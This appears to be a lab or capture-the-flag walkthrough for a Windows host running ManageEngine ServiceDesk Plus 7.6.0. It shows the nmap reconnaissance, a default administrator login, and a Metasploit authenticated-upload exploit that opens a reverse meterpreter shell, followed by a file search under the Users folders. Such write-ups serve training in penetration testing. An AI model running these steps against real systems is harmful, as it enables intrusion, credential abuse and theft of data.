# Reconnaissance
`$ nmap -sV -sC -oA nmap/scripts 192.168.220.43 -Pn`
```
Nmap scan report for 192.168.220.43
Host is up (0.29s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h39m43s, deviation: 4h37m08s, median: -17s
| smb2-time: 
|   date: 2023-12-31T08:35:53
|_  start_date: 2023-12-31T08:03:55
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:35:be (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-12-31T00:35:53-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.12 seconds

```
## Port 8080
### Web Informational
`Help Desk Software by 	ManageEngine ServiceDesk Plus  |  7.6.0`

# Pre-Exploitation
## Security Misconfiguration
Web Login with default password: administrator (http://192.168.220.43:8080/HomePage.do)

## Known Vulnerabilities
`$ searchsploit manageengine`
```
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit)                                 | java/remote/35845.rb
ManageEngine ADManager Plus 5.2 Build 5210 - 'domainName' Cross-Site Scripting                                        | java/webapps/36667.txt
ManageEngine ADManager Plus 5.2 Build 5210 - 'Operation' Cross-Site Scripting                                         | java/webapps/36666.txt
ManageEngine ADManager Plus 6.5.7 - Cross-Site Scripting                                                              | windows_x86-64/webapps/45256.txt
ManageEngine ADManager Plus 6.5.7 - HTML Injection                                                                    | windows/webapps/45254.txt
ManageEngine ADSelfService Build prior to 6003 - Remote Code Execution (Unauthenticated)                              | java/webapps/48739.txt
```

# Exploitation
## Manage Engine
### Metasploit
```
msf6 > search ManageEngine Multiple Products

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  auxiliary/admin/http/manageengine_dir_listing    2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary Directory Listing
   1  auxiliary/admin/http/manageengine_file_download  2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
   2  exploit/multi/http/manageengine_auth_upload      2014-12-15       excellent  Yes    ManageEngine Multiple Products Authenticated File Upload


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/manageengine_auth_upload

msf6 > use 2
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/manageengine_auth_upload) > set RHOSTS 192.168.220.43
RHOSTS => 192.168.220.43
msf6 exploit(multi/http/manageengine_auth_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/manageengine_auth_upload) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > set PASSWORD administrator
PASSWORD => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > exploit
```

# Post-Exploitation
```
meterpreter > pwd
C:\ManageEngine\ServiceDesk\bin
meterpreter > search -f *.txt -d C:/Users/
```

